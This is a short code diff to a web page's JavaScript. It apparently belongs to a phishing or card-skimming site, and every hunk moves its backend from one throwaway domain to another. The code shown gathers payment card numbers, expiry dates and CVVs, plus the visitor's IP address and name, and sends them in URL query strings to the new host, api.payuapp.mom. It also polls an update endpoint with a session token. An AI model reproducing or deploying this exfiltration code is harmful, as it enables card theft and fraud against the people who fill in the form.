@@ -408,7 +408,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('https://api.mobiletecso.cfd/test')
+          fetch('https://api.payuapp.mom/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -451,7 +451,7 @@ async function sendIPToServer() {
         return;
     }
 
-    const url3 = `https://api.mobiletecso.cfd/chel?ip=${ip}&name=${name}`;
+    const url3 = `https://api.payuapp.mom/chel?ip=${ip}&name=${name}`;
 
     fetch(url3)
         .then(response => {
@@ -525,7 +525,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
     let ip = localStorage.getItem('ip');
     if(question){
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "https://api.payuapp.mom/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -538,7 +538,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
               "&ip=" + encodeURIComponent(ip);
     } else {
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "https://api.payuapp.mom/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -602,7 +602,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 });
 
 function fetchUpdate() {
-  fetch('https://api.mobiletecso.cfd/update'+"?session=" + encodeURIComponent(session))
+  fetch('https://api.payuapp.mom/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
